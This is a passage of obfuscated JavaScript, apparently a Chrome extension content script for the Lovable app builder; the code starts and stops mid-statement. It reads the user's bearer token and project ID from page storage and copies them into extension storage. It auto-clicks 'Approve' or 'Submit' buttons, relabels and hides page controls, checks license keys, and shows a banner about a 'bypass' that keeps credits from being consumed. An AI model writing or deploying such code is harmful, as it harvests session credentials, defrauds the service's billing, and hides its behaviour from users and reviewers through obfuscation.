chrome['sto'+'rag'+'e']['onC'+'han'+'ged']['add'+'Lis'+'ten'+'er'](function(_n491b7f){
if(_n491b7f['ql_'+'dis'+'pla'+'y_m'+'sg']&&_n491b7f['ql_'+'dis'+'pla'+'y_m'+'sg']['new'+'Val'+'ue'])try{
const _n1755b8={
}
;
_n1755b8['typ'+'e']='__Q'+'L_L'+'AST'+'_MS'+'G__',_n1755b8['msg']=_n491b7f['ql_'+'dis'+'pla'+'y_m'+'sg']['new'+'Val'+'ue'],window['pos'+'tMe'+'ssa'+'ge'](_n1755b8,'*');
}
catch(_n525b04){
}
(_n491b7f['ql_'+'ck']||_n491b7f['ql_'+'lic'+'ens'+'e_v'+'ali'+'d'])&&_relayFixKey();
}
);
}
catch(ct_n27e7d1){
}
chrome['run'+'tim'+'e']['onM'+'ess'+'age']['add'+'Lis'+'ten'+'er'](function(_n479ad1,_n4e8972,_ncd020b){
if(_n479ad1&&_n479ad1['typ'+'e']==='sp_'+'imp'+'rov'+'e_p'+'rom'+'pt'&&_n479ad1['tex'+'t'])return((async()=>{
try{
const _n297d82=await _qlImproveOnline(_n479ad1['tex'+'t']);
_ncd020b({
'improved':_n297d82!==null?_n297d82:_qlImproveOffline(_n479ad1['tex'+'t'])}
);
}
catch(_n314c89){
_ncd020b({
'improved':_qlImproveOffline(_n479ad1['tex'+'t'])}
);
}
}
)()),!![];
if(_n479ad1&&_n479ad1['act'+'ion']==='tog'+'gle'+'Shi'+'eld'){
if(_n479ad1['act'+'ive'])_qlInjectShield();
else _qlRemoveShield();
const _n12d6a8={
}
;
return _n12d6a8['ok']=!![],_ncd020b(_n12d6a8),![];
}
if(_n479ad1&&_n479ad1['act'+'ion']==='doR'+'equ'+'est'+'Lat'+'est'+'Tok'+'en'){
const _n1465cc=readTokenFromLocalStorage(),_n455705=getProjectFromUrl();
if(_n1465cc||_n455705)try{
const _n229213={
}
,_n2738d5=_n1465cc?_n1465cc['rep'+'lac'+'e'](/^Bearer\s+/i,'')['tri'+'m']():null;
if(_n2738d5){
_n229213['lov'+'abl'+'e_t'+'oke'+'n']=_n2738d5;
if(_myTabId!=null)_n229213['lov'+'_to'+'k_'+_myTabId]=_n2738d5;
}
if(_n455705){
_n229213['lov'+'abl'+'e_p'+'roj'+'ect'+'Id']=_n455705;
if(_myTabId!=null)_n229213['lov'+'_pi'+'d_'+_myTabId]=_n455705;
}
if(Object['key'+'s'](_n229213)['len'+'gth'])return chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n229213,function(){
const _n57a06f={
}
;
_n57a06f['ok']=!![],_ncd020b(_n57a06f);
}
),!![];
}
catch(_n5d8b23){
}
const _n188128={
}
;
return _n188128['ok']=!![],_ncd020b(_n188128),![];
}
if(_n479ad1&&_n479ad1['act'+'ion']==='get'+'Tok'+'en'){
const _n1a196c=readTokenFromLocalStorage(),_n54ef63=getProjectFromUrl(),_n1d8f45={
}
;
return _n1d8f45['tok'+'en']=_n1a196c||null,_n1d8f45['pro'+'jec'+'tId']=_n54ef63||null,_ncd020b(_n1d8f45),![];
}
if(_n479ad1&&_n479ad1['act'+'ion']==='cli'+'ckA'+'ppr'+'ove'+'But'+'ton'){
var _n139b58=![];
try{
var _n32a04a=document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('[da'+'ta-'+'but'+'ton'+'],\x20'+'but'+'ton');
for(var _n42abfb=0x0;
_n42abfb<_n32a04a['len'+'gth'];
_n42abfb++){
var _n1f3539=(_n32a04a[_n42abfb]['tex'+'tCo'+'nte'+'nt']||'')['rep'+'lac'+'e'](/\s+/g,'\x20')['tri'+'m']();
if(/^(approve|submit)$/i['tes'+'t'](_n1f3539)){
console['log']('[Co'+'nte'+'nt]'+'\x20🖱️\x20'+'Cli'+'can'+'do\x20'+'pro'+'gra'+'mat'+'ica'+'men'+'te\x20'+'em:',_n1f3539),_n32a04a[_n42abfb]['cli'+'ck'](),_n139b58=!![];
break;
}
}
}
catch(_n2a6208){
console['war'+'n']('[Co'+'nte'+'nt]'+'\x20cl'+'ick'+'App'+'rov'+'eBu'+'tto'+'n\x20e'+'rro'+':',_n2a6208);
}
const _n57a11d={
}
;
return _n57a11d['ok']=_n139b58,_n57a11d['fou'+'nd']=_n139b58,_ncd020b(_n57a11d),![];
}
const _n2737c3={
}
;
return _n2737c3['sta'+'tus']='ok',_ncd020b(_n2737c3),![];
}
),(function(){
const _n8e898f=[/^Fix\s+error$/i,/^Fix\s+Error$/i,/^Visual\s+edit$/i],_n4a80da='Lov'+'abl'+'e\x20∞',_n3b3395=new WeakSet();
let _n5bb2c2=0x0,_n49dd24=Date['now'](),_n338437=![];
function _n5ab8df(_n37ee9f){
try{
let _n2e69c4=_n37ee9f['par'+'ent'+'Ele'+'men'+'t'];
for(let _n26c278=0x0;
_n26c278<0xc;
_n26c278++){
if(!_n2e69c4||_n2e69c4===document['bod'+'y']||_n2e69c4===document['doc'+'ume'+'ntE'+'lem'+'ent'])return;
const _n42e181=_n2e69c4['par'+'ent'+'Ele'+'men'+'t'];
if(!_n42e181||_n42e181===document['bod'+'y']||_n42e181===document['doc'+'ume'+'ntE'+'lem'+'ent'])return;
const _n16b524=Array['fro'+'m'](_n42e181['chi'+'ldr'+'en']);
if(_n16b524['len'+'gth']>=0x2){
const _n3dbd09=_n16b524['ind'+'exO'+'f'](_n2e69c4),_n559888=_n16b524['sli'+'ce'](_n3dbd09+0x1),_n29c242=_n16b524['sli'+'ce'](0x0,_n3dbd09)['fil'+'ter'](_nae6cf9=>{
try{
const _n8ad7e5=_nae6cf9['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n8ad7e5['hei'+'ght']>0x1e)return!![];
if((_nae6cf9['tex'+'tCo'+'nte'+'nt']||'')['tri'+'m']()['len'+'gth']>0x28)return!![];
}
catch(_n502c82){
}
return![];
}
),_n32d27b=[..._n559888,..._n29c242];
if(_n32d27b['len'+'gth']>0x0){
_n32d27b['for'+'Eac'+'h'](_n5972a0=>_n5972a0['sty'+'le']['set'+'Pro'+'per'+'ty']('dis'+'pla'+'y','non'+'e','imp'+'ort'+'ant'));
return;
}
}
_n2e69c4=_n42e181;
}
}
catch(_n97101f){
}
}
function _n384894(_n397aa3){
if(!_n397aa3||_n397aa3['nod'+'eTy'+'pe']!==Node['TEX'+'T_N'+'ODE'])return;
if(_n3b3395['has'](_n397aa3))return;
if(_n338437)return;
const _n4fe574=(_n397aa3['tex'+'tCo'+'nte'+'nt']||'')['tri'+'m']();
if(!_n4fe574)return;
if(_n4fe574===_n4a80da){
_n3b3395['add'](_n397aa3);
return;
}
for(const _n444d7b of _n8e898f){
if(_n444d7b['tes'+'t'](_n4fe574)){
const _n236c73=Date['now']();
_n236c73-_n49dd24>0x3e8&&(_n49dd24=_n236c73,_n5bb2c2=0x0);
_n5bb2c2++;
if(_n5bb2c2>0x1e){
_n338437=!![],setTimeout(()=>{
_n338437=![],_n5bb2c2=0x0;
}
,0xbb8);
return;
}
_n3b3395['add'](_n397aa3);
const _n461f8c=_n397aa3['tex'+'tCo'+'nte'+'nt']['mat'+'ch'](/^\s*/)[0x0],_n7554e7=_n397aa3['tex'+'tCo'+'nte'+'nt']['mat'+'ch'](/\s*$/)[0x0];
_n397aa3['tex'+'tCo'+'nte'+'nt']=_n461f8c+_n4a80da+_n7554e7,_n5ab8df(_n397aa3);
return;
}
}
}
function _n218e80(_n5ccb0a){
if(!_n5ccb0a||_n5ccb0a['nod'+'eTy'+'pe']!==Node['ELE'+'MEN'+'T_N'+'ODE'])return;
const _n366764=document['cre'+'ate'+'Tre'+'eWa'+'lke'+'r'](_n5ccb0a,NodeFilter['SHO'+'W_T'+'EXT']);
let _n3f28bb;
while(_n3f28bb=_n366764['nex'+'tNo'+'de']())_n384894(_n3f28bb);
}
function _n421410(){
_n218e80(document['bod'+'y']);
const _n4266f0=new MutationObserver(_n410796=>{
for(const _n1aa87a of _n410796){
if(_n1aa87a['typ'+'e']==='cha'+'rac'+'ter'+'Dat'+'a'){
_n384894(_n1aa87a['tar'+'get']);
continue;
}
for(const _n444388 of _n1aa87a['add'+'edN'+'ode'+'s']){
if(_n444388['nod'+'eTy'+'pe']===Node['TEX'+'T_N'+'ODE'])_n384894(_n444388);
else{
if(_n444388['nod'+'eTy'+'pe']===Node['ELE'+'MEN'+'T_N'+'ODE'])_n218e80(_n444388);
}
}
}
}
),_n483086={
}
;
_n483086['chi'+'ldL'+'ist']=!![],_n483086['sub'+'tre'+'e']=!![],_n483086['cha'+'rac'+'ter'+'Dat'+'a']=!![],_n4266f0['obs'+'erv'+'e'](document['bod'+'y'],_n483086);
}
if(document['bod'+'y'])_n421410();
else document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('DOM'+'Con'+'ten'+'tLo'+'ade'+'d',_n421410);
}
()),(function(){
const _n3f8ab0='ql_'+'nat'+'ive'+'_by'+'pas'+'s_a'+'cti'+'ve',_n145ab8='ql_'+'wid'+'get'+'_po'+'s';
let _n1d9b8e=![],_n3779d0=null,_ne2eca8=null,_n2c6956=null,_n21ee0d=null,_ne10f78=null,_n849915=null,_n141a67=null,_n388058=0x0,_n411c15=![],_n4ee4f7=![],_n2cac60=null,_n4f3c7f=null,_nd68324=null,_n42a806=[],_n156f99=![];
function _n5c3fa8(){
try{
return!_n156f99&&!!(chrome&&chrome['run'+'tim'+'e']&&chrome['run'+'tim'+'e']['id']);
}
catch(_n345e67){
return![];
}
}
function _n4f7061(){
if(_n156f99)return;
_n156f99=!![],_n1d9b8e=![];
try{
_n5a8956();
}
catch(_n596a99){
}
try{
_ne2eca8&&_ne2eca8['rem'+'ove']();
}
catch(_n372709){
}
try{
_n21ee0d&&_n21ee0d['rem'+'ove']();
}
catch(_n134b98){
}
try{
_ne10f78&&_ne10f78['rem'+'ove']();
}
catch(_n2ef979){
}
try{
_n849915&&_n849915['rem'+'ove']();
}
catch(_n4385b5){
}
try{
if(_n3779d0)_nf0b1c6(![]);
}
catch(_n7d0843){
}
try{
document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('key'+'dow'+'n',_n2d3804,!![]);
}
catch(_n9d19){
}
try{
document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n4bbcf4,!![]);
}
catch(_n3f7947){
}
try{
document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('pas'+'te',_n1b8af6,!![]);
}
catch(_n4fbd53){
}
try{
document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gen'+'ter',_n46d7d2,!![]);
}
catch(_n29c5ed){
}
try{
document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gov'+'er',_n3416eb,!![]);
}
catch(_n4a6863){
}
try{
document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gle'+'ave',_n250ea4,!![]);
}
catch(_n7b1888){
}
try{
document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dro'+'p',_n41db29,!![]);
}
catch(_nd0372a){
}
try{
_n591638();
}
catch(_n2125e3){
}
}
function _n403e81(_n1e6c8c,_n3dc294){
if(!_n5c3fa8()){
_n4f7061();
return;
}
try{
chrome['sto'+'rag'+'e']['loc'+'al']['get'](_n1e6c8c,_n1c3c2e=>{
if(!_n5c3fa8()){
_n4f7061();
return;
}
try{
_n3dc294(_n1c3c2e);
}
catch(_nce89a5){
_n4f7061();
}
}
);
}
catch(_n5d27d7){
_n4f7061();
}
}
function _n541a20(_n2a4bde){
if(!_n5c3fa8()){
_n4f7061();
return;
}
try{
chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n2a4bde);
}
catch(_n469e07){
_n4f7061();
}
}
function _n306ada(_n36186b){
if(!_n5c3fa8()){
_n4f7061();
return;
}
try{
chrome['sto'+'rag'+'e']['loc'+'al']['rem'+'ove'](_n36186b);
}
catch(_n7fe149){
_n4f7061();
}
}
function _n252730(_n49f276,_n4b8695){
if(!_n5c3fa8()){
_n4f7061();
if(_n4b8695)_n4b8695(null);
return;
}
try{
chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n49f276,_n19d480=>{
try{
void chrome['run'+'tim'+'e']['las'+'tEr'+'ror'];
}
catch(_n4fb3a5){
}
if(_n4b8695)_n4b8695(_n19d480);
}
);
}
catch(_n550e32){
_n4f7061();
if(_n4b8695)_n4b8695(null);
}
}
function _n213a2e(_n2c3f49){
if(!_n5c3fa8())return _n4f7061(),'';
try{
return chrome['run'+'tim'+'e']['get'+'URL'](_n2c3f49);
}
catch(_n3e4f89){
return _n4f7061(),'';
}
}
const _n3db245=['ql_'+'lic'+'ens'+'e_v'+'ali'+'d','ql_'+'lk','ql_'+'ck','ql_'+'exp'+'ire'+'s_a'+'t','ql_'+'lic'+'ens'+'e_s'+'tat'+'us'];
function _n176bc6(_n46479c){
if(!_n46479c||!_n46479c['ql_'+'lic'+'ens'+'e_v'+'ali'+'d']||!_n46479c['ql_'+'lk']||!_n46479c['ql_'+'ck'])return![];
if(_n46479c['ql_'+'exp'+'ire'+'s_a'+'t']){
const _n24ecf9=new Date(_n46479c['ql_'+'exp'+'ire'+'s_a'+'t'])['get'+'Tim'+'e']();
if(!isNaN(_n24ecf9)&&_n24ecf9<=Date['now']())return![];
}
if(_n46479c['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']&&/block|expir|invalid/i['tes'+'t'](_n46479c['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']))return![];
return!![];
}
function _n296b2b(){
_n306ada(['ql_'+'lic'+'ens'+'e_v'+'ali'+'d','ql_'+'lk','ql_'+'ses'+'sio'+'n_i'+'d','ql_'+'use'+'r_n'+'ame','ql_'+'exp'+'ire'+'s_a'+'t','ql_'+'act'+'iva'+'ted'+'_at','ql_'+'lic'+'ens'+'e_s'+'tat'+'us','ql_'+'ed','ql_'+'ck']);
}
function _n1a4cc1(_n55cf0f,_n918a63,_na0de6c){
const _n7b3ee1=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n7b3ee1['tex'+'tCo'+'nte'+'nt']=_n55cf0f,_n7b3ee1['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
bo'+'tto'+'m:8'+'8px'+'!im'+'por'+'tan'+'t;
r'+'igh'+'t:2'+'4px'+'!im'+'por'+'tan'+'t;
'+('bac'+'kgr'+'oun'+'d:')+(_n918a63?'#16'+'a34'+'a':'#dc'+'262'+'6')+('!im'+'por'+'tan'+'t;
c'+'olo'+'r:#'+'fff'+'!im'+'por'+'tan'+'t;
')+('pad'+'din'+'g:1'+'0px'+'\x2016'+'px!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'10p'+'x!i'+'mpo'+'rta'+'nt;
'+'fon'+'t:6'+'00\x20'+'13p'+'x\x20s'+'ans'+'-se'+'rif'+'!im'+'por'+'tan'+'t;
')+('z-i'+'nde'+'x:2'+'147'+'483'+'647'+'!im'+'por'+'tan'+'t;
b'+'ox-'+'sha'+'dow'+':0\x20'+'4px'+'\x2016'+'px\x20'+'rgb'+'a(0'+',0,'+'0,.'+'3)!'+'imp'+'ort'+'ant'+';
')+('opa'+'cit'+'y:0'+'!im'+'por'+'tan'+'t;
t'+'ran'+'sit'+'ion'+':op'+'aci'+'ty\x20'+'.25'+'s!i'+'mpo'+'rta'+'nt;
'+'poi'+'nte'+'r-e'+'ven'+'ts:'+'non'+'e!i'+'mpo'+'rta'+'nt;
'+'max'+'-wi'+'dth'+':28'+'0px'+'!im'+'por'+'tan'+'t;
'),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n7b3ee1),requestAnimationFrame(()=>{
_n7b3ee1['sty'+'le']['opa'+'cit'+'y']='1';
}
),setTimeout(()=>{
_n7b3ee1['sty'+'le']['opa'+'cit'+'y']='0',setTimeout(()=>_n7b3ee1['rem'+'ove'](),0x12c);
}
,_na0de6c||0xc80);
}
function _n4f9e09(){
if(document['get'+'Ele'+'men'+'tBy'+'Id']('__q'+'l_p'+'uls'+'e_s'+'tyl'+'e__'))return;
const _n446f52=document['cre'+'ate'+'Ele'+'men'+'t']('sty'+'le');
_n446f52['id']='__q'+'l_p'+'uls'+'e_s'+'tyl'+'e__',_n446f52['tex'+'tCo'+'nte'+'nt']='@ke'+'yfr'+'ame'+'s\x20_'+'_ql'+'Pul'+'se{
'+('0%,'+'100'+'%{
b'+'ox-'+'sha'+'dow'+':0\x20'+'0\x200'+'\x202p'+'x\x20r'+'gba'+'(12'+'4,5'+'8,2'+'37,'+'0.8'+'5),'+'0\x200'+'\x2010'+'px\x20'+'rgb'+'a(1'+'24,'+'58,'+'237'+',0.'+'45)'+'}
')+('50%'+'{
bo'+'x-s'+'had'+'ow:'+'0\x200'+'\x200\x20'+'3px'+'\x20rg'+'ba('+'167'+',13'+'9,2'+'50,'+'1),'+'0\x200'+'\x2022'+'px\x20'+'rgb'+'a(1'+'24,'+'58,'+'237'+',0.'+'75)'+',0\x20'+'0\x204'+'4px'+'\x20rg'+'ba('+'124'+',58'+',23'+'7,0'+'.25'+')}
')+'}
',(document['hea'+'d']||document['doc'+'ume'+'ntE'+'lem'+'ent'])['app'+'end'+'Chi'+'ld'](_n446f52);
}
function _nf0b1c6(_n3c1b81){
if(!_n3779d0)return;
_n3c1b81?(_n4f9e09(),_n3779d0['sty'+'le']['set'+'Pro'+'per'+'ty']('out'+'lin'+'e','non'+'e','imp'+'ort'+'ant'),_n3779d0['sty'+'le']['set'+'Pro'+'per'+'ty']('bor'+'der'+'-ra'+'diu'+'s','12p'+'x','imp'+'ort'+'ant'),_n3779d0['sty'+'le']['set'+'Pro'+'per'+'ty']('ani'+'mat'+'ion','__q'+'lPu'+'lse'+'\x202s'+'\x20ea'+'se-'+'in-'+'out'+'\x20in'+'fin'+'ite','imp'+'ort'+'ant')):(_n3779d0['sty'+'le']['rem'+'ove'+'Pro'+'per'+'ty']('ani'+'mat'+'ion'),_n3779d0['sty'+'le']['rem'+'ove'+'Pro'+'per'+'ty']('bor'+'der'+'-ra'+'diu'+'s'),_n3779d0['sty'+'le']['rem'+'ove'+'Pro'+'per'+'ty']('out'+'lin'+'e'),_n3779d0['sty'+'le']['rem'+'ove'+'Pro'+'per'+'ty']('out'+'lin'+'e-o'+'ffs'+'et'));
}
function _n214bc4(){
if(_n21ee0d)return;
const _n5703d1=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n5703d1['id']='__q'+'l_n'+'b_b'+'ann'+'er_'+'_',_n5703d1['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
z-'+'ind'+'ex:'+'214'+'748'+'364'+'7!i'+'mpo'+'rta'+'nt;
'+'box'+'-si'+'zin'+'g:b'+'ord'+'er-'+'box'+'!im'+'por'+'tan'+'t;
'+('pad'+'din'+'g:2'+'px\x20'+'9px'+'!im'+'por'+'tan'+'t;
b'+'ord'+'er-'+'rad'+'ius'+':6p'+'x!i'+'mpo'+'rta'+'nt;
'+'fon'+'t:7'+'00\x20'+'10p'+'x\x20s'+'ans'+'-se'+'rif'+'!im'+'por'+'tan'+'t;
')+('tex'+'t-a'+'lig'+'n:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
po'+'int'+'er-'+'eve'+'nts'+':no'+'ne!'+'imp'+'ort'+'ant'+';
wh'+'ite'+'-sp'+'ace'+':no'+'wra'+'p!i'+'mpo'+'rta'+'nt;
')+('ove'+'rfl'+'ow:'+'hid'+'den'+'!im'+'por'+'tan'+'t;
t'+'ext'+'-ov'+'erf'+'low'+':el'+'lip'+'sis'+'!im'+'por'+'tan'+'t;
w'+'idt'+'h:f'+'it-'+'con'+'ten'+'t!i'+'mpo'+'rta'+'nt;
')+('bac'+'kgr'+'oun'+'d:r'+'gba'+'(10'+',10'+',15'+',.5'+'5)!'+'imp'+'ort'+'ant'+';
ba'+'ckd'+'rop'+'-fi'+'lte'+'r:b'+'lur'+'(2p'+'x)!'+'imp'+'ort'+'ant'+';
'),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n5703d1),_n21ee0d=_n5703d1;
}
function _n9054bd(){
_n21ee0d&&(_n21ee0d['rem'+'ove'](),_n21ee0d=null);
}
function _n3432e6(_n4de4ba){
if(!_n21ee0d)return;
const _n326c0c=_n4de4ba?'#22'+'c55'+'e':'#ef'+'444'+'4',_n85e8a0=_n4de4ba?'rgb'+'a(3'+'4,1'+'97,'+'94,'+'.85'+')':'rgb'+'a(2'+'39,'+'68,'+'68,'+'.85'+')';
_n21ee0d['tex'+'tCo'+'nte'+'nt']=_n4de4ba?'✓\x20L'+'ova'+'ble'+'\x20∞\x20'+'Ati'+'vad'+'o\x20n'+'o\x20C'+'hat'+'\x20na'+'tiv'+'o!':'⚠\x20L'+'ova'+'ble'+'\x20∞\x20'+'des'+'ati'+'vad'+'o\x20—'+'\x20cr'+'édi'+'tos'+'\x20se'+'rão'+'\x20co'+'nsu'+'mid'+'os!',_n21ee0d['sty'+'le']['set'+'Pro'+'per'+'ty']('col'+'or',_n326c0c,'imp'+'ort'+'ant'),_n21ee0d['sty'+'le']['set'+'Pro'+'per'+'ty']('bor'+'der','1px'+'\x20so'+'lid'+'\x20'+_n326c0c,'imp'+'ort'+'ant'),_n21ee0d['sty'+'le']['set'+'Pro'+'per'+'ty']('box'+'-sh'+'ado'+'w','0\x200'+'\x206p'+'x\x20'+_n85e8a0+(',\x200'+'\x200\x20'+'2px'+'\x20')+_n85e8a0+('\x20in'+'set'),'imp'+'ort'+'ant'),_n21ee0d['sty'+'le']['set'+'Pro'+'per'+'ty']('tex'+'t-s'+'had'+'ow','0\x200'+'\x206p'+'x\x20'+_n85e8a0,'imp'+'ort'+'ant');
}
function _n4e30a2(){
const _n43eaf6=document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('[ro'+'le='+'\x22me'+'nu\x22'+'],\x20'+'[ro'+'le='+'\x22li'+'stb'+'ox\x22'+'],\x20'+'[ro'+'le='+'\x22di'+'alo'+'g\x22]');
for(const _n12566b of _n43eaf6){
try{
const _n271128=_n12566b['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n271128['wid'+'th']>0x0&&_n271128['hei'+'ght']>0x0){
const _n2b3cfc=getComputedStyle(_n12566b);
if(_n2b3cfc['vis'+'ibi'+'lit'+'y']!=='hid'+'den'&&_n2b3cfc['dis'+'pla'+'y']!=='non'+'e'&&_n2b3cfc['opa'+'cit'+'y']!=='0')return!![];
}
}
catch(_n6dd627){
}
}
return![];
}
function _na78c3(){
if(!_n21ee0d||!_n3779d0)return;
try{
if(_n4e30a2()){
_n21ee0d['sty'+'le']['set'+'Pro'+'per'+'ty']('dis'+'pla'+'y','non'+'e','imp'+'ort'+'ant');
return;
}
_n21ee0d['sty'+'le']['set'+'Pro'+'per'+'ty']('dis'+'pla'+'y','blo'+'ck','imp'+'ort'+'ant');
const _n196626=_n5c1974(_n3779d0),_n1a2ae0=_n196626?_n196626['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']():_n3779d0['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n1a2ae0['wid'+'th']===0x0&&_n1a2ae0['hei'+'ght']===0x0)return;
let _n4b7e06=_n1a2ae0['top']-0x16;
if(_ne10f78&&_n42a806['len'+'gth']>0x0){
const _ndb5c03=_ne10f78['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_ndb5c03['hei'+'ght']>0x0)_n4b7e06=_ndb5c03['top']-0x16;
}
_n21ee0d['sty'+'le']['top']=Math['max'](0x4,_n4b7e06)+'px',_n21ee0d['sty'+'le']['lef'+'t']=_n1a2ae0['lef'+'t']+'px';
}
catch(_n30327f){
}
}
function _n5122f3(){
if(_ne10f78)return;
if(!document['get'+'Ele'+'men'+'tBy'+'Id']('__q'+'l_n'+'b_s'+'pin'+'_st'+'yle'+'__')){
const _ncf6ef=document['cre'+'ate'+'Ele'+'men'+'t']('sty'+'le');
_ncf6ef['id']='__q'+'l_n'+'b_s'+'pin'+'_st'+'yle'+'__',_ncf6ef['tex'+'tCo'+'nte'+'nt']='@ke'+'yfr'+'ame'+'s\x20_'+'_ql'+'_sp'+'in\x20'+'{
\x20t'+'o\x20{
'+'\x20tr'+'ans'+'for'+'m:\x20'+'rot'+'ate'+'(36'+'0de'+'g);
'+'\x20}
\x20'+'}
'+('@ke'+'yfr'+'ame'+'s\x20_'+'_ql'+'_pu'+'lse'+'\x20{
\x20'+'0%,'+'100'+'%{
b'+'ox-'+'sha'+'dow'+':0\x20'+'0\x200'+'\x203p'+'x\x20r'+'gba'+'(34'+',19'+'7,9'+'4,.'+'35)'+',0\x20'+'4px'+'\x2016'+'px\x20'+'rgb'+'a(0'+',0,'+'0,.'+'5)}
'+'\x2050'+'%{
b'+'ox-'+'sha'+'dow'+':0\x20'+'0\x200'+'\x207p'+'x\x20r'+'gba'+'(34'+',19'+'7,9'+'4,.'+'55)'+',0\x20'+'0\x202'+'2px'+'\x20rg'+'ba('+'34,'+'197'+',94'+',.4'+'),0'+'\x204p'+'x\x201'+'6px'+'\x20rg'+'ba('+'0,0'+',0,'+'.5)'+'}
\x20}
'),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_ncf6ef);
}
const _n5434a1=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n5434a1['id']='__q'+'l_n'+'b_c'+'hip'+'s__',_n5434a1['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
z-'+'ind'+'ex:'+'214'+'748'+'364'+'7!i'+'mpo'+'rta'+'nt;
'+'dis'+'pla'+'y:f'+'lex'+'!im'+'por'+'tan'+'t;
'+('gap'+':8p'+'x!i'+'mpo'+'rta'+'nt;
'+'fle'+'x-w'+'rap'+':wr'+'ap!'+'imp'+'ort'+'ant'+';
ma'+'x-w'+'idt'+'h:3'+'60p'+'x!i'+'mpo'+'rta'+'nt;
'),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n5434a1),_ne10f78=_n5434a1;
}
function _n1147c3(){
return _n42a806['som'+'e'](_n36fe49=>_n36fe49['upl'+'oad'+'ing']);
}
function _n4deb4e(){
_ne10f78&&(_ne10f78['rem'+'ove'](),_ne10f78=null);
}
function _nb05df1(_n59b396){
if(!_n59b396)return'';
const _n201a81=0x400,_n423b0d=['B','KB','MB','GB'],_n2c0586=Math['flo'+'or'](Math['log'](_n59b396)/Math['log'](_n201a81));
return parseFloat((_n59b396/Math['pow'](_n201a81,_n2c0586))['toF'+'ixe'+'d'](0x1))+'\x20'+_n423b0d[_n2c0586];
}
function _n58a975(_n500f92){
const _n532437=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n532437['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
in'+'set'+':0!'+'imp'+'ort'+'ant'+';
ba'+'ckg'+'rou'+'nd:'+'rgb'+'a(0'+',0,'+'0,.'+'75)'+'!im'+'por'+'tan'+'t;
'+('z-i'+'nde'+'x:2'+'147'+'483'+'647'+'!im'+'por'+'tan'+'t;
d'+'isp'+'lay'+':fl'+'ex!'+'imp'+'ort'+'ant'+';
al'+'ign'+'-it'+'ems'+':ce'+'nte'+'r!i'+'mpo'+'rta'+'nt;
')+('jus'+'tif'+'y-c'+'ont'+'ent'+':ce'+'nte'+'r!i'+'mpo'+'rta'+'nt;
'+'fon'+'t-f'+'ami'+'ly:'+'san'+'s-s'+'eri'+'f!i'+'mpo'+'rta'+'nt;
'+'cur'+'sor'+':po'+'int'+'er!'+'imp'+'ort'+'ant'+';
');
const _n3f0990=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n3f0990['sty'+'le']['css'+'Tex'+'t']='bac'+'kgr'+'oun'+'d:#'+'181'+'81b'+'!im'+'por'+'tan'+'t;
b'+'ord'+'er:'+'1px'+'\x20so'+'lid'+'\x20rg'+'ba('+'255'+',25'+'5,2'+'55,'+'.15'+')!i'+'mpo'+'rta'+'nt;
'+('bor'+'der'+'-ra'+'diu'+'s:1'+'4px'+'!im'+'por'+'tan'+'t;
p'+'add'+'ing'+':18'+'px!'+'imp'+'ort'+'ant'+';
ma'+'x-w'+'idt'+'h:9'+'0vw'+'!im'+'por'+'tan'+'t;
')+('max'+'-he'+'igh'+'t:9'+'0vh'+'!im'+'por'+'tan'+'t;
o'+'ver'+'flo'+'w:a'+'uto'+'!im'+'por'+'tan'+'t;
c'+'urs'+'or:'+'def'+'aul'+'t!i'+'mpo'+'rta'+'nt;
')+('box'+'-sh'+'ado'+'w:0'+'\x2012'+'px\x20'+'48p'+'x\x20r'+'gba'+'(0,'+'0,0'+',.6'+')!i'+'mpo'+'rta'+'nt;
'+'dis'+'pla'+'y:f'+'lex'+'!im'+'por'+'tan'+'t;
')+('fle'+'x-d'+'ire'+'cti'+'on:'+'col'+'umn'+'!im'+'por'+'tan'+'t;
g'+'ap:'+'12p'+'x!i'+'mpo'+'rta'+'nt;
'+'ali'+'gn-'+'ite'+'ms:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
'),_n3f0990['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n1b3a96=>_n1b3a96['sto'+'pPr'+'opa'+'gat'+'ion']());
